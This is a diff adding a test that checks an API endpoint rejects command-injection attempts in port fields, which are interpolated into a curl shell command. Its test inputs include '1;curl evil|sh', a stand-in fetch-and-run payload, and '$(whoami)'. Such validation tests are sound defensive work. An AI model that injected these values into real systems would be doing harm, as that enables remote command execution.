@@ -429,6 +429,17 @@ describe('API /api/openclaw/test', () => {
     }
   });
 
+  it('POST /api/openclaw/test rejects injection-shaped port / localPort with 400 (#312)', async () => {
+    // port/localPort are interpolated into the `curl ...:<port>/healthz` shell
+    // command, so they must be plain integers in range.
+    const base = { host: '10.0.0.1', sshUser: 'nobody', sshKeyPath: '/k' };
+    for (const [name, bad] of [['port', '1;curl evil|sh'], ['localPort', '$(whoami)'], ['port', 70000]]) {
+      const { status, data } = await request(server, 'POST', '/api/openclaw/test', { ...base, [name]: bad });
+      assert.equal(status, 400, `expected 400 for ${name}=${bad}`);
+      assert.match(data.error, new RegExp(name));
+    }
+  });
+
   it('POST /api/openclaw/test returns results object', async () => {
     const { status, data } = await request(server, 'POST', '/api/openclaw/test', {
       host: '127.0.0.1',
